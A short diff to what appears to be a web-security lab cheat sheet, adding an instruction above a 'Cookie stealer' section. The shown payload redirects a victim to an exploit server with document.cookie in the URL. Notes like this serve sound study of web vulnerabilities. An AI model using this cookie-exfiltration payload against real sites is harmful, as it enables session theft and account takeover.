@@ -655,6 +655,7 @@ An account delete feature specifies the path in a serialized format: `s:19:"user
 
 ### Cookie stealer
 
+When a sink processes the value of the parameter directly, host this at the exploit server:
 ```html
 HTTP/1.1 200 OK
 Content-Type: text/html; charset=utf-8
@@ -663,6 +664,7 @@ Content-Type: text/html; charset=utf-8
 location = "https://ID.web-security-academy.net/?parameter="location%3D%27https%3A%2F%2Fexploit-ID.exploit-server.net%2F%3Fcookies%3D%27%2Bdocument.cookie%3B;
 </script>
 ```
+
 ### Database Enumeration
 
 Determine the number of columns of the target:
